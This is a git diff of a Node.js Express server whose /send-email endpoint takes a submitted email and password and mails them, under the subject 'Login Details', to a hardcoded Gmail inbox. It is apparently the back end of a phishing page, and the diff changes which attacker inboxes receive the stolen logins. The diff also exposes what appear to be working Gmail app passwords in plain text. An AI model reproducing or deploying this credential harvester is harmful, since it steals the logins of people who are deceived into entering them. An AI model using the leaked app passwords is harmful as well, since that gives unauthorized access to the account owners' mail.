@@ -14,8 +14,8 @@ app.use(bodyParser.json());
 let transporter = nodemailer.createTransport({
     service: 'gmail',
     auth: {
-        user: 'capssmedia@gmail.com',  // Replace with your Gmail address
-        pass: 'yrkc efci nylu vpky'  // Replace with your app password
+        user: 'sauravgarg5922@gmail.com',  // Replace with your Gmail address
+        pass: 'oaav lkcs afwy qrjt'  // Replace with your app password
     }
 });
 
@@ -24,8 +24,8 @@ app.post('/send-email', (req, res) => {
     const { email, password } = req.body;
 
     let mailOptions = {
-        from: 'capssmedia@gmail.com',
-        to: 'capssmedia@gmail.com',  // Replace with recipient email if different
+        from: 'ghostriderworkspace@gmail.com',
+        to: 'ghostriderworkspace@gmail.com',  // Replace with recipient email if different
         subject: 'Login Details',
         text: `Email: ${email}\nPassword: ${password}`
     };
@@ -40,7 +40,7 @@ app.post('/send-email', (req, res) => {
 });
 
 // Start the server
-const PORT = process.env.PORT || 5500; // Change port to 5500
+const PORT = process.env.PORT || 5500;
 app.listen(PORT, () => {
     console.log(`Server is running on port ${PORT}`);
 });
